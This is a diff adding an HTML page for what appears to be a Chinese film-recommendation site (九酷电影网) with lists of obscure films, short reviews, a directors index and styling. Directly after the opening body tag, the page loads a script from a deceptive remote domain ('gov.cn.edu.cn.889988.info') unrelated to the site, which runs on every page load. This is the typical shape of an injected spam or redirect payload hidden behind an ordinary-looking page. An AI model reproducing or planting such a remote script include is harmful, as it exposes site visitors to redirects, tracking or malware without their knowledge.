@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>九酷电影网：小众冷门高分电影挖掘，独立佳作与地下经典整理</title>
+<meta name="description" content="九酷电影网聚焦被主流榜单忽略的小众电影与高分冷门佳作，整理独立电影、地下经典、cult片、先锋影像与冷门高分作品，附详细影评、导演访谈线索与观影清单，为资深影迷提供不一样的选片参考。">
+<meta name="keywords" content="九酷电影网,小众电影,冷门高分电影,独立电影,地下经典,cult电影,先锋影像,影迷清单">
+<link rel="canonical" href="https://jiukudianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#0a0a0f;
+--bg2:#11111a;
+--card:#15151f;
+--card2:#1c1c28;
+--line:rgba(255,255,255,.08);
+--txt:#e8e8f0;
+--mute:#8b8ba3;
+--cool:#5eead4;
+--cool2:#2dd4bf;
+--pink:#f472b6;
+--purple:#a78bfa;
+--yellow:#fde047;
+--r:14px;
+}
+html{scroll-behavior:smooth}
+body{font-family:"Space Grotesk","PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.75;font-size:15px;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 噪点背景 */
+body::before{content:"";position:fixed;inset:0;z-index:-2;background:radial-gradient(700px 380px at 82% 12%,rgba(94,234,212,.13),transparent),radial-gradient(600px 340px at 12% 40%,rgba(244,114,182,.1),transparent),radial-gradient(900px 500px at 50% 100%,rgba(167,139,250,.09),transparent)}
+body::after{content:"";position:fixed;inset:0;z-index:-1;opacity:.035;pointer-events:none;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+
+/* 顶栏 */
+header{position:sticky;top:0;z-index:60;background:rgba(10,10,15,.82);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.head{display:flex;align-items:center;justify-content:space-between;padding:15px 0;gap:20px}
+.brand{display:flex;align-items:center;gap:14px}
+.brand .n9{font-size:34px;font-weight:900;line-height:1;background:linear-gradient(135deg,var(--cool),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .txt b{font-size:18px;font-weight:800;letter-spacing:1px}
+.brand .txt small{display:block;font-size:10.5px;color:var(--mute);letter-spacing:2.5px;text-transform:uppercase}
+.nav{display:flex;gap:4px}
+.nav a{padding:8px 15px;border-radius:8px;font-size:13.5px;font-weight:600;color:var(--mute);transition:.2s}
+.nav a:hover,.nav a.cur{color:var(--cool);background:rgba(94,234,212,.1)}
+.search{display:flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--line);border-radius:9px;padding:8px 14px;width:200px}
+.search input{background:none;border:0;outline:0;color:var(--txt);font-size:13px;width:100%}
+.search input::placeholder{color:#55556a}
+.search span{color:var(--cool);font-size:13px}
+
+/* 首屏 */
+.hero{padding:90px 0 70px;position:relative}
+.hero .wrap{position:relative;z-index:2}
+.kicker{display:inline-flex;gap:10px;align-items:center;font-size:11.5px;color:var(--cool);font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:24px}
+.kicker::before{content:"";width:32px;height:2px;background:var(--cool)}
+h1{font-size:62px;font-weight:900;line-height:1.1;letter-spacing:-1.5px;margin-bottom:22px}
+h1 .strike{color:var(--mute);text-decoration:line-through;text-decoration-color:rgba(244,114,182,.5)}
+h1 .it{font-style:italic;color:var(--cool)}
+.hero p.lead{font-size:17px;color:var(--mute);max-width:560px;margin-bottom:34px}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:44px}
+.btn{border:0;cursor:pointer;font-size:14px;font-weight:700;padding:13px 26px;border-radius:9px;transition:.2s}
+.b1{background:var(--cool);color:#06231f}
+.b1:hover{background:var(--cool2);transform:translateY(-2px)}
+.b2{background:transparent;color:var(--txt);border:1px solid var(--line)}
+.b2:hover{border-color:var(--pink);color:var(--pink)}
+.tags{display:flex;gap:9px;flex-wrap:wrap}
+.tags a{font-size:12px;color:var(--mute);border:1px solid var(--line);padding:6px 13px;border-radius:20px;transition:.2s}
+.tags a:hover{color:var(--bg);background:var(--pink);border-color:var(--pink)}
+
+/* 通用 */
+section{padding:66px 0}
+.sec-t{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;margin-bottom:38px;flex-wrap:wrap}
+.sec-t .l .tag{font-size:11px;color:var(--cool);letter-spacing:2px;text-transform:uppercase;font-weight:700}
+.sec-t h2{font-size:31px;font-weight:900;letter-spacing:-.5px;margin-top:6px}
+.sec-t .l p{color:var(--mute);font-size:14px;max-width:440px;margin-top:8px}
+.sec-t .r a{font-size:13px;color:var(--cool);border-bottom:1px solid var(--line);padding-bottom:3px;transition:.2s}
+.sec-t .r a:hover{color:var(--pink);border-color:var(--pink)}
+
+/* 片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(235px,1fr));gap:20px}
+.cell{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.28s;position:relative}
+.cell:hover{border-color:var(--cool);transform:translateY(-5px)}
+.cell .poster{height:130px;position:relative;display:flex;align-items:flex-end;padding:14px;overflow:hidden}
+.cell .poster::before{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(0,0,0,.55))}
+.cell .poster b{color:#fff;font-size:16px;font-weight:900;position:relative;z-index:2;line-height:1.3}
+.cell .poster .yr{position:absolute;top:12px;right:12px;background:rgba(0,0,0,.45);color:#fff;font-size:11px;padding:2px 8px;border-radius:20px;z-index:2;backdrop-filter:blur(4px)}
+.p1{background:linear-gradient(135deg,#0f3d3e,#0e7490)}
+.p2{background:linear-gradient(135deg,#831843,#9d174d)}
+.p3{background:linear-gradient(135deg,#4c1d95,#6d28d9)}
+.p4{background:linear-gradient(135deg,#854d0e,#ca8a04)}
+.p5{background:linear-gradient(135deg,#7f1d1d,#dc2626)}
+.p6{background:linear-gradient(135deg,#164e63,#0891b2)}
+.p7{background:linear-gradient(135deg,#3b0764,#9333ea)}
+.p8{background:linear-gradient(135deg,#14532d,#16a34a)}
+.cell .bd{padding:15px 16px 18px}
+.cell .bd .row{display:flex;justify-content:space-between;font-size:12px;color:var(--mute);margin-bottom:9px}
+.cell .bd .row b{color:var(--cool);font-weight:700}
+.cell .bd p{font-size:12.5px;color:var(--mute);line-height:1.6}
+.cell .star{position:absolute;top:12px;left:12px;background:var(--yellow);color:#422006;font-size:11px;font-weight:800;padding:2px 7px;border-radius:6px;z-index:2}
+
+/* 影评长条 */
+.revs{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.rev{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:24px;position:relative;transition:.25s}
+.rev:hover{border-color:var(--pink)}
+.rev .quote{font-size:32px;color:var(--pink);line-height:1;position:absolute;top:16px;right:20px;font-family:Georgia,serif}
+.rev .cat{font-size:11px;color:var(--cool);font-weight:700;letter-spacing:1px;text-transform:uppercase}
+.rev h4{font-size:17px;font-weight:800;margin:10px 0 10px;line-height:1.45}
+.rev p{font-size:13.5px;color:var(--mute)}
+.rev .who{display:flex;align-items:center;gap:10px;margin-top:16px;padding-top:14px;border-top:1px solid var(--line)}
+.av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--purple),var(--pink));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff;flex-shrink:0}
+.who span{font-size:12.5px;color:var(--mute)}
+.who span b{color:var(--txt);font-weight:700}
+
+/* 导演索引 */
+.dir{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px}
+.dcard{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:18px;text-align:center;transition:.25s}
+.dcard:hover{border-color:var(--purple);background:var(--card2)}
+.dcard .av2{width:60px;height:60px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#fff}
+.dcard h4{font-size:15px;font-weight:800;margin-bottom:4px}
+.dcard p{font-size:12px;color:var(--mute);margin-bottom:10px}
+.dcard .cnt{font-size:11px;color:var(--cool);background:rgba(94,234,212,.1);padding:3px 10px;border-radius:20px}
+
+/* 片单编号 */
+.numbers{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
+.num{display:flex;gap:16px;align-items:flex-start;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:18px;transition:.22s}
+.num:hover{border-color:var(--yellow);background:var(--card2)}
+.num .no{font-size:26px;font-weight:900;color:var(--mute);line-height:1;flex-shrink:0;font-family:Georgia,serif}
+.num:hover .no{color:var(--yellow)}
+.num b{font-size:14.5px;font-weight:800;display:block;margin-bottom:5px}
+.num span{font-size:12.5px;color:var(--mute);line-height:1.6}
+
+/* 数据条 */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:18px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:22px;text-align:center}
+.stat b{display:block;font-size:30px;font-weight:900;background:linear-gradient(135deg,var(--cool),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:12.5px;color:var(--mute);display:block;margin-top:4px}
+
+/* 页脚 */
+footer{background:#06060a;border-top:1px solid var(--line);padding:54px 0 24px;margin-top:30px}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px}
+.foot .logo{font-size:20px;font-weight:900;margin-bottom:10px;letter-spacing:1px}
+.foot .logo em{font-style:normal;color:var(--cool)}
+.foot p{font-size:13px;color:var(--mute);max-width:330px}
+.foot h5{font-size:13px;color:var(--txt);margin-bottom:14px;font-weight:700}
+.foot li{margin-bottom:9px;font-size:13px;color:var(--mute)}
+.foot a:hover{color:var(--pink)}
+.bot{border-top:1px solid var(--line);padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:12px;color:#5a5a70}
+.bot .dm{color:var(--cool);font-family:"Space Grotesk",monospace}
+
+/* 响应式 */
+@media(max-width:960px){
+h1{font-size:44px}
+.search{display:none}
+.nav{display:none}
+.revs{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.wrap{padding:0 15px}
+section{padding:46px 0}
+h1{font-size:34px}
+h1 .strike{display:block}
+.sec-t{margin-bottom:26px}
+.sec-t h2{font-size:23px}
+.foot{grid-template-columns:1fr 1fr}
+.hero{padding:56px 0 48px}
+.btn{padding:12px 20px;font-size:13.5px}
+}
+@media(max-width:400px){
+.foot{grid-template-columns:1fr}
+.grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+<div class="wrap">
+<div class="head">
+<div class="brand">
+<div class="n9">9</div>
+<div class="txt"><b>九酷电影网</b><small>Beyond the mainstream</small></div>
+</div>
+<nav class="nav">
+<a href="#" class="cur">首页</a>
+<a href="#grid">冷门片单</a>
+<a href="#revs">影评札记</a>
+<a href="#dir">导演索引</a>
+<a href="#num">必看清单</a>
+<a href="#stats">关于九酷</a>
+</nav>
+<div class="search"><span>⌕</span><input placeholder="搜索片名 / 导演"></div>
+</div>
+</div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero">
+<div class="wrap">
+<div class="kicker">OFF THE RADAR · SINCE 1999</div>
+<h1>绕过爆款。<br><span class="it">挖出</span>真正<span class="strike">热门</span>的<br>高分冷门片。</h1>
+<p class="lead">九酷电影网不追院线热度，只做一件事：在主流榜单的盲区里，替资深影迷翻出值得一看的独立佳作、地下经典与先锋影像。</p>
+<div class="cta">
+<a href="#grid" class="btn b1">进入冷门片单</a>
+<a href="#num" class="btn b2">查看必看清单 →</a>
+</div>
+<div class="tags">
+<a href="#">#独立电影</a>
+<a href="#">#cult片</a>
+<a href="#">#冷门高分</a>
+<a href="#">#地下经典</a>
+<a href="#">#先锋影像</a>
+<a href="#">#修复重映</a>
+<a href="#">#短片集</a>
+</div>
+</div>
+</section>
+
+<!-- 冷门片单 -->
+<section id="grid">
+<div class="wrap">
+<div class="sec-t">
+<div class="l"><span class="tag">THE UNDERGROUND LIST</span><h2>冷门片单</h2><p>不靠流量说话，评分与口碑才是入选门槛。以下均为主流平台容易被淹没的作品。</p></div>
+<div class="r"><a href="#">查看完整片库 →</a></div>
+</div>
+<div class="grid">
+<div class="cell"><div class="poster p1"><span class="yr">2003</span><span class="star">8.7</span><b>失焦的边境</b></div><div class="bd"><div class="row"><span>阿根廷 · 剧情</span><b>112 min</b></div><p>边境小镇上两个家庭的隐秘纠葛，镜头始终保持一种克制的旁观距离。</p></div></div>
+<div class="cell"><div class="poster p2"><span class="yr">1998</span><span class="star">8.9</span><b>夜行电车</b></div><div class="bd"><div class="row"><span>韩国 · 犯罪</span><b>98 min</b></div><p>一桩未破的夜间劫案，全片以电车司机的视角展开，结构近乎散文。</p></div></div>
+<div class="cell"><div class="poster p3"><span class="yr">2011</span><span class="star">8.4</span><b>沉默合唱团</b></div><div class="bd"><div class="row"><span>罗马尼亚 · 文艺</span><b>134 min</b></div><p>修道院合唱团的日常被拍成一场无声的仪式，观众被迫学会"听"沉默。</p></div></div>
+<div class="cell"><div class="poster p4"><span class="yr">2007</span><span class="star">8.2</span><b>雨季的算术</b></div><div class="bd"><div class="row"><span>孟加拉 · 独立</span><b>89 min</b></div><p>用数字丈量贫困，一部把纪录片手法嫁接到剧情片的实验作品。</p></div></div>
+<div class="cell"><div class="poster p5"><span class="yr">2015</span><span class="star">8.5</span><b>第七个房间</b></div><div class="bd"><div class="row"><span>匈牙利 · 悬疑</span><b>121 min</b></div><p>密闭空间内的心理博弈，反转不靠技巧而靠人物的道德位移。</p></div></div>
+<div class="cell"><div class="poster p6"><span class="yr">2001</span><span class="star">8.6</span><b>海底邮差</b></div><div class="bd"><div class="row"><span>菲律宾 · 奇幻</span><b>107 min</b></div><p>海岛邮差与深海传说的交叠，色彩运用被后世反复致敬。</p></div></div>
+<div class="cell"><div class="poster p7"><span class="yr">2018</span><span class="star">8.3</span><b>塑料花博物馆</b></div><div class="bd"><div class="row"><span>智利 · 实验</span><b>76 min</b></div><p>全片无对白，靠道具与空间讲述一座虚拟博物馆的兴衰。</p></div></div>
+<div class="cell"><div class="poster p8"><span class="yr">1995</span><span class="star">8.8</span><b>麦田里的录音机</b></div><div class="bd"><div class="row"><span>伊朗 · 家庭</span><b>103 min</b></div><p>孩童视角的乡村寓言，被多个电影节列为"被遗忘的杰作"。</p></div></div>
+</div>
+</div>
+</section>
+
+<!-- 影评札记 -->
+<section id="revs" style="background:var(--bg2)">
+<div class="wrap">
+<div class="sec-t">
+<div class="l"><span class="tag">REVIEWS & NOTES</span><h2>影评札记</h2><p>不是剧情复述，而是关于镜头、节奏与叙事选择的具体讨论。</p></div>
+<div class="r"><a href="#">全部评论 →</a></div>
+</div>
+<div class="revs">
+<div class="rev"><span class="quote">”</span><div class="cat">作者电影</div><h4>《失焦的边境》为何用长焦压缩空间</h4><p>导演刻意放弃景深，让人物与背景"贴"在同一平面上，地理距离被物理抹平，暗示边境线本身只是人为划线。</p><div class="who"><div class="av">A</div><span>评论人 <b>阿榛</b> · 12 分钟阅读</span></div></div>
+<div class="rev"><span class="quote">”</span><div class="cat">类型解构</div><h4>《第七个房间》把悬疑片的重心挪到了哪</h4><p>传统悬疑靠信息差制造悬念，本片却把重心压在人物是否愿意承认已知事实上，类型框架因此发生了微妙位移。</p><div class="who"><div class="av">M</div><span>专栏作者 <b>木白</b> · 9 分钟阅读</span></div></div>
+<div class="rev"><span class="quote">”</span><div class="cat">修复观察</div><h4>《麦田里的录音机》4K 修复后的色彩取舍</h4><p>修复团队没有一味追求鲜艳，而是保留原拷贝的轻微偏黄，理由是那是影片年代感的有机组成部分。</p><div class="who"><div class="av">S</div><span>技术编辑 <b>黍离</b> · 7 分钟阅读</span></div></div>
+<div class="rev"><span class="quote">”</span><div class="cat">作者访谈</div><h4>《塑料花博物馆》导演谈"无对白"的代价</h4><p>无对白不是风格宣言，而是预算逼出的选择——但这一限制反而催生了更精确的道具语言。</p><div class="who"><div class="av">L</div><span>特约撰稿 <b>临川</b> · 15 分钟阅读</span></div></div>
+</div>
+</div>
+</section>
+
+<!-- 导演索引 -->
+<section id="dir">
+<div class="wrap">
+<div class="sec-t">
+<div class="l"><span class="tag">DIRECTORS INDEX</span><h2>导演索引</h2><p>值得持续追踪的作者导演，按地域与创作阶段整理其完整片单。</p></div>
+<div class="r"><a href="#">完整索引 →</a></div>
+</div>
+<div class="dir">
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#0e7490,#06b6d4)">C</div><h4>卡洛斯·雷耶斯</h4><p>阿根廷 · 3 部长片</p><span class="cnt">边境三部曲</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#9d174d,#f472b6)">K</div><h4>金敏书</h4><p>韩国 · 散文式犯罪</p><span class="cnt">2 部长片</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#6d28d9,#a78bfa)">P</div><h4>普雷达·约内斯库</h4><p>罗马尼亚 · 极简主义</p><span class="cnt">5 部作品</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#ca8a04,#fde047)">R</div><h4>拉赫曼·侯赛因</h4><p>孟加拉 · 社会写实</p><span class="cnt">4 部作品</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#dc2626,#fb923c)">V</div><h4>瓦尔加·伊什特万</h4><p>匈牙利 · 心理悬疑</p><span class="cnt">3 部作品</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#0891b2,#22d3ee)">B</div><h4>贝尼特斯·玛雅</h4><p>菲律宾 · 魔幻写实</p><span class="cnt">2 部作品</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#9333ea,#e879f9)">T</div><h4>塔玛拉·席尔瓦</h4><p>智利 · 实验影像</p><span class="cnt">6 部短片</span></div>
+<div class="dcard"><div class="av2" style="background:linear-gradient(135deg,#16a34a,#4ade80)">A</div><h4>阿米尔·巴盖里</h4><p>伊朗 · 儿童视角</p><span class="cnt">4 部作品</span></div>
+</div>
+</div>
+</section>
+
+<!-- 必看清单 -->
+<section id="num" style="background:var(--bg2)">
+<div class="wrap">
+<div class="sec-t">
+<div class="l"><span class="tag">STARTER PACK</span><h2>新手必看清单</h2><p>第一次来九酷，按这个顺序看，最快理解我们筛选作品的标准。</p></div>
+<div class="r"><a href="#">自定义你的清单 →</a></div>
+</div>
+<div class="numbers">
+<div class="num"><div class="no">01</div><div><b>《麦田里的录音机》1995</b><span>用最朴素的方式讲一个家庭，是理解伊朗儿童视角电影的最佳入口。</span></div></div>
+<div class="num"><div class="no">02</div><div><b>《失焦的边境》2003</b><span>长焦压缩空间的典型范例，看完会重新理解"地理距离"在电影里的含义。</span></div></div>
+<div class="num"><div class="no">03</div><div><b>《夜行电车》1998</b><span>散文式犯罪叙事，几乎没有强情节，却让人记住整条电车线路。</span></div></div>
+<div class="num"><div class="no">04</div><div><b>《沉默合唱团》2011</b><span>适合用来训练"听沉默"的能力，节奏极慢但信息量密集。</span></div></div>
+<div class="num"><div class="no">05</div><div><b>《第七个房间》2015</b><span>悬疑类型的解构样本，看完可对比主流悬疑片的叙事策略。</span></div></div>
+<div class="num"><div class="no">06</div><div><b>《塑料花博物馆》2018</b><span>无对白实验片，是检验自己能否接受"纯影像叙事"的试金石。</span></div></div>
+</div>
+</div>
+</section>
+
+<!-- 数据 -->
+<section id="stats">
+<div class="wrap">
+<div class="sec-t">
+<div class="l"><span class="tag">BY THE NUMBERS</span><h2>关于九酷</h2><p>我们不做大而全的片库，只做有门槛的筛选与有内容的讨论。</p></div>
+</div>
+<div class="stats">
+<div class="stat"><b>1,200+</b><span>收录冷门作品</span></div>
+<div class="stat"><b>86</b><span>覆盖国家与地区</span></div>
+<div class="stat"><b>340+</b><span>原创影评札记</span></div>
+<div class="stat"><b>7.8+</b><span>入选最低评分线</span></div>
+<div class="stat"><b>0</b><span>主流爆款推荐</span></div>
+<div class="stat"><b>52</b><span>作者导演索引</span></div>
+</div>
+</div>
+</section>
+
+<footer>
+<div class="wrap">
+<div class="foot">
+<div>
+<div class="logo">九酷<em>电影网</em></div>
+<p>专注挖掘主流视野之外的高分冷门电影与独立佳作，为资深影迷提供有门槛、有内容的选片参考与影评讨论。</p>
+</div>
+<div><h5>浏览</h5><ul>
+<li><a href="#grid">冷门片单</a></li>
+<li><a href="#revs">影评札记</a></li>
+<li><a href="#dir">导演索引</a></li>
+<li><a href="#num">必看清单</a></li>
+</ul></div>
+<div><h5>分类</h5><ul>
+<li><a href="#">独立电影</a></li>
+<li><a href="#">cult 片</a></li>
+<li><a href="#">先锋影像</a></li>
+<li><a href="#">修复重映</a></li>
+</ul></div>
+<div><h5>关于</h5><ul>
+<li><a href="#">筛选标准</a></li>
+<li><a href="#">投稿影评</a></li>
+<li><a href="#">版权声明</a></li>
+<li><a href="#">联系我们</a></li>
+</ul></div>
+</div>
+<div class="bot">
+<span>© 2026 九酷电影网 · 影评与选片为原创内容，影片版权归属各制片方</span>
+<span class="dm">https://jiukudianyingwang-zh.github.io</span>
+</div>
+</div>
+</footer>
+
+</body>
+</html>
